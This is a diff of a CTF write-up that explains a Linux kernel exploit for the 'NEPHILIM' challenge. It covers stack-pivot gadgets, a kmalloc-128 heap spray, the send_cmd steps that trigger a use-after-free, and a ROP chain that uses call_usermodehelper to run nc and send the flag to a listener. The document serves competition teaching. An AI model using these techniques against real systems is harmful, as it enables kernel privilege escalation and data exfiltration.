@@ -234,7 +234,7 @@ __attribute__((naked)) void nkrcu_pivot(void)
         "ret\n\t"
     );
 }</code></pre>
-          <p>Four bytes — <code>48 8b 27</code>, <code>c3</code>. The byte sequence appears nowhere in this vmlinux, and neither do the other <code>mov (%rXX),%rsp ; ret</code> forms. <code>pop %rsp ; ret</code> and <code>leave ; ret</code> are both plentiful, but they source the new <code>rsp</code> from the kworker stack, and at the indirect call only <code>rdi</code> is under control.</p>
+          <p>Four bytes — <code>48 8b 27</code>, <code>c3</code>. The byte sequence appears nowhere in this vmlinux, and neither do the other <code>mov (%rXX),%rsp ; ret</code> forms. <code>pop %rsp ; ret</code> and <code>leave ; ret</code> are both plentiful, but neither takes its new <code>rsp</code> from anywhere the attacker reaches — <code>pop</code> takes it off the kworker stack, <code>leave</code> out of <code>rbp</code>, which holds a module address at this call site. What is controlled there is <code>rdi</code>, and the branch target.</p>
 
           <h3>nkmon.ko</h3>
           <p>A timer re-arms every <code>5 * HZ</code> and schedules work. The work function makes one indirect call per snapshot:</p>
@@ -339,7 +339,7 @@ kernel_base = kernel_fn - PRINTK_OFF</code></pre>
 
     send_cmd(CMD_SPRAY_F, p64(rop_kaddr))   # miss: free and go again</code></pre>
           <p>Under SLUB's per-CPU LIFO freelist the object comes straight back — provided it belonged to the slab the CPU is currently allocating from. If it did not, <code>kfree()</code> puts it on that slab's own freelist and the next <code>kmalloc(128)</code> hands back a different address.</p>
-          <p>That is what the loop absorbs. Real competition is negligible here: the guest is an idle busybox initramfs on one vCPU, and nothing on the packet path touches <code>kmalloc-128</code> — <code>struct sk_buff</code> comes from the unmergeable <code>skbuff_head_cache</code>, and any <code>__alloc_skb</code> head carries a 320-byte <code>skb_shared_info</code>.</p>
+          <p>That is what the loop absorbs. Real competition is negligible here: the guest is an idle busybox initramfs on one vCPU, and the skb path itself stays out of <code>kmalloc-128</code> — <code>struct sk_buff</code> comes from the unmergeable <code>skbuff_head_cache</code>, and any <code>__alloc_skb</code> head carries a 320-byte <code>skb_shared_info</code>, so no head lands below <code>kmalloc-512</code>.</p>
           <p>The comments in the script below blame Docker and netfilter for the same thing. They are wrong twice over — the guest has netfilter compiled out, and host-side activity cannot reach the guest's freelists at all. The retry loops they justify are still worth keeping, because slab placement is what they actually absorb, and in practice both sprays land on the first attempt.</p>
           <p>Triggering the free is three commands in a fixed order:</p>
           <pre><code>send_cmd(CMD_SNAP,   p64(desc_id))   # nk_snaps[0].desc = desc_kaddr
@@ -369,7 +369,7 @@ nkrcu_pivot:  mov (%rdi),%rsp                    ; rsp = rop_kaddr
           <p>What it lands on is a 128-byte slab object. <code>call_usermodehelper</code> then blocks in <code>UMH_WAIT_PROC</code> for the lifetime of <code>nc</code>, with its frames growing down past <code>rop_kaddr</code> into whatever neighbours it.</p>
           <p>The <code>argv[]</code> array is built inside the ROP object at <code>rop_kaddr+80</code>, above the <code>rsp</code> the chain leaves behind, so descending frames cannot reach it whatever the freelist does.</p>
           <p>The strings it points at are a separate object, and that one is placed wherever the allocator felt like. Here it came back <code>0x80</code> above the ROP object, so it sits above <code>rsp</code> too. The frames descend onto unrelated objects that nothing in an idle guest reads.</p>
-          <p>Had the spray gone the other way, the kworker would have smashed the <code>argv</code> strings before exec reached them. <code>call_usermodehelper</code> stores <code>path</code> and <code>argv</code> as pointers in <code>struct subprocess_info</code> and the helper thread dereferences them later, so the bytes have to survive the whole wait. A run that needs several attempts also leaves freed <code>kmalloc-128</code> objects in exactly that region.</p>
+          <p>Had the spray gone the other way, the kworker would have smashed the <code>argv</code> strings before exec reached them. <code>call_usermodehelper</code> stores <code>path</code> and <code>argv</code> as pointers in <code>struct subprocess_info</code>, and the bytes are not copied until the helper thread reaches <code>kernel_execve</code> and runs <code>copy_strings_kernel</code> — which is also where the pivoted kworker is deepest. A run that needs several attempts also leaves freed <code>kmalloc-128</code> objects in exactly that region.</p>
           <pre><code>#!/usr/bin/env python3
 # NEPHILIM | DefCamp CTF 2026 | Kernel pwn | Insane
 #
@@ -688,7 +688,7 @@ if __name__ == "__main__":
           <p>The exploit never sees the flag — it arrives on the listener:</p>
           <pre><code>Connection received on 172.17.0.2 47352
 CTF{&lt;64 hex chars&gt;}</code></pre>
-          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the box panics. Excerpted from an earlier boot, against an earlier kernel build than the one shipped, so the addresses differ from the run above:</p>
+          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the kworker faults at address zero. The guest boots with <code>oops=panic panic=-1</code>, so that oops takes the box down. Excerpted from an earlier boot, against an earlier kernel build than the one shipped, so the addresses differ from the run above:</p>
           <pre><code>[   19.591444] BUG: kernel NULL pointer dereference, address: 0000000000000000
 [   19.591459] #PF: supervisor instruction fetch in kernel mode
 [   19.591459] CPU: 0 PID: 40 Comm: kworker/0:2 Tainted: G           O       6.1.184 #1
@@ -700,7 +700,7 @@ CTF{&lt;64 hex chars&gt;}</code></pre>
 [   19.591459] Call Trace:
 [   19.591459] Modules linked in: nknet(O) nkmon(O) nkrcu(O)</code></pre>
           <div class="note">
-            <code>RSP</code> is a direct-map heap address while <code>RBX</code> is the vmalloc'd kworker stack holding <code>local[]</code> — the stack was pivoted onto the heap. The call trace is empty because the unwinder has nothing left to walk. Panicking on success is deliberate: a solved instance dies instead of lingering as a rooted box.
+            <code>RSP</code> is a direct-map heap address while <code>RBX</code> is the kworker stack holding <code>local[]</code>, vmalloc'd because the build sets <code>CONFIG_VMAP_STACK</code> — the stack was pivoted onto the heap. The call trace is empty because the unwinder has nothing left to walk. Panicking on success is deliberate: a solved instance dies instead of lingering as a rooted box.
           </div>
         </section>
 
@@ -721,7 +721,7 @@ CTF{&lt;64 hex chars&gt;}</code></pre>
     memcpy(out, desc, 40);</code></pre>
           <p>There is no offset parameter on that path. Not on the wire — the payload is consumed as one 8-byte id, and trailing bytes are ignored.</p>
           <p>Not in the API either. <code>out_len</code> is a destination capacity used as a lower bound, hardcoded to 40 by the caller. The <code>memcpy</code> length is the literal 40, and the source offset is always zero.</p>
-          <p>The first 16 bytes are identity and state, leaving 24 bytes of payload per call. The flag is 69 characters, so it takes three reads.</p>
+          <p>Only the first 8 bytes are load-bearing: <code>nk_find_desc_rcu</code> matches on <code>id</code> and nothing else. <code>state</code> and <code>flags</code> are written once at creation and never read again by any of the three modules, so they can carry payload too. That leaves 32 bytes per call at best, 24 if a solver treats the whole header as off limits. The flag is 69 characters, so either way it takes three reads.</p>
           <div class="note">
             Because the read window cannot move, the paging has to happen on the write side. A solver cannot ask for bytes 24 to 47 of an object — only for bytes 0 to 39 of some object. Each page needs kernel execution that copies a different slice into the window, and the response carries no offset marker.
           </div>
